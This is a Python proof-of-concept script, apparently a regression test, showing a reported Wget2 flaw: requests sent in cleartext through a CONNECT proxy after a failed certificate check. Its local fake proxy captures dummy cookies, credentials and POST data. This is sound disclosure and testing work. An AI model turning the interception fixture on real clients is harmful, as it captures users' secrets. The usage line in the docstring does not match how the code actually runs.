#!/usr/bin/env python3
"""
PoC: GNU Wget2 sends HTTPS requests in CLEARTEXT after a failed certificate
check, when the connection goes through a CONNECT proxy.

Self-contained. Binds 127.0.0.1 only. Contacts nothing external. The "target"
host is never resolved: the fixture answers the CONNECT tunnel itself.

Usage:  python3 poc.py /path/to/wget2      (default: wget2 from PATH)
"""
import os, socket, ssl, subprocess, sys, tempfile, threading, time

srcdir = os.environ["SRCDIR"]
builddir = os.environ["BUILDDIR"]
print(f"SRCDIR={srcdir}")
print(f"BUILDDIR={builddir}")

WGET2 = os.path.join(builddir, "src", "wget2")
TMP = f".test_{os.getpid()}"
CERT = os.path.join(srcdir,"certs","proxy-cert.pem")
KEY = os.path.join(srcdir,"certs","proxy-key.pem")
COOKIE = "session=DUMMY-SECRET-VALUE"

def serve(proxy_mode, result):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    srv.bind(("127.0.0.1", 0))
    port = srv.getsockname()[1]
    result["port"] = port
    srv.listen(2)
    srv.settimeout(25)

    try:
        sock,_ = srv.accept()
    except (socket.timeout, OSError):
        result["err"] = "no connection"
        srv.close()
        return

    sock.settimeout(10)
    raw = bytearray()

    try:
        if proxy_mode: # consume CONNECT, open the tunnel
            req = b""
            while b"\r\n\r\n" not in req:
                d = sock.recv(4096)
                if not d:
                    return
                req += d
            sock.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")

        inc, out = ssl.MemoryBIO(), ssl.MemoryBIO()
        tls = ctx.wrap_bio(inc, out, server_side=True)

        for _ in range(40): # TLS over BIOs: the raw socket stays ours
            try:
                tls.do_handshake()
                break
            except ssl.SSLWantReadError:
                p = out.read()
                if p:
                    sock.sendall(p)
                try:
                    d = sock.recv(8192)
                except (socket.timeout, ConnectionResetError):
                    break
                if not d:
                    break
                raw.extend(d)
                inc.write(d)
            except ssl.SSLError:
                out.read()
                break

        while b"GET /" not in bytes(raw): # did anything arrive in the clear?
            try:
                d = sock.recv(8192)
            except (socket.timeout, ConnectionResetError, OSError):
                break
            if not d:
                break
            raw.extend(d)

        blob = bytes(raw)
        i = blob.find(b"GET /")
        if i < 0:
            i = blob.find(b"POST /")

        result["cleartext"] = (i >= 0)
        if i >= 0:
            result["request"] = blob[i:i+900].decode("latin1", "replace")

    finally:
        try:
            sock.close()
        except Exception:
            pass
        srv.close()

def run(label, proxy_mode, url, extra=()):
    res = {}

    t = threading.Thread(
        target=serve,
        args=(proxy_mode, res),
        daemon=True
    )
    t.start()

    while "port" not in res and t.is_alive():
        time.sleep(0.01)

    port = res["port"]
    url = url.format(port=port)

    env = {"PATH":"/usr/bin:/bin", "HOME":TMP}
    if proxy_mode:
        env["https_proxy"] = f"http://127.0.0.1:{port}"

    p = subprocess.run(
        [WGET2,"--no-config","--tries=1","--timeout=6",
         f"--header=Cookie: {COOKIE}", *extra,
         "-O",os.path.join(TMP,"out"), url],
        env=env,
        capture_output=True,
        text=True,
        timeout=40)

    t.join(timeout=15)

    print(f"\n=== {label} ===")
    for line in (p.stderr or "").splitlines():
        if line.strip():
            print("  wget2: " + line.strip())

    if res.get("cleartext"):
        print("  >>> CLEARTEXT REQUEST RECEIVED by a peer whose certificate was REJECTED:")
        for line in res["request"].splitlines():
            if line.strip():
                print("      | " + line)
        return True

    print("  >>> no cleartext request: wget2 aborted correctly")
    return False

direct = run(
    "CONTROL - direct https://, untrusted cert, NO proxy",
    False,
    "https://127.0.0.1:{port}/secret"
)

viaproxy = run(
    "TEST - same untrusted cert, through a CONNECT proxy",
    True,
    "https://target.invalid/secret"
)

impact = run(
    "IMPACT - what the leak carries (--auth-no-challenge + POST body)",
    True,
    "https://target.invalid/pay",
    ("--user=alice","--password=s3cr3tpw","--auth-no-challenge","--post-data=account=12345&amount=9999")
)

print("\n================ RESULT ================")
print(f"  direct connection leaked cleartext : {direct}")
print(f"  proxied connection leaked cleartext: {viaproxy}")
print(f"  credentials / POST body leaked     : {impact}")

if direct or viaproxy or impact:
    sys.exit(1)
